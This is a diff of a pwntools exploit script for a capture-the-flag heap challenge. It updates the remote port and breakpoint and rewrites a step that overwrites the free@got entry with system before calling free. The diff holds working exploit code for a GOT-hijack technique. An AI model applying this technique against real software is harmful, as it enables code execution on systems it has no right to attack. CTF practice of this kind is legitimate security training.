@@ -3,10 +3,10 @@ from LibcSearcher import *
 context(log_level='debug', arch='amd64', os='linux')
 
 if len(sys.argv) > 1:
-  conn = remote('node4.buuoj.cn', 28772)
+  conn = remote('node4.buuoj.cn', 25593)
 else:
   conn = process(sys.argv[0][:-7])
-  gdb.attach(conn, 'b *0x400cdc')
+  gdb.attach(conn, 'b *0x400ce8')
  
 # gadgets
 cat_flag = 0x400c23
@@ -83,8 +83,9 @@ def exp2():
     free_got = elf.got['free']
     payload = p64(0x0) * 3 + p64(free_got)
     edit(0, len(payload), payload)
-
-    payload = p64(0x0) * 3 + p64(system) 
+    
+    # step-3 hijack free@got with system
+    payload =  p64(system) 
     edit(0, len(payload), payload)
 
     free(2)
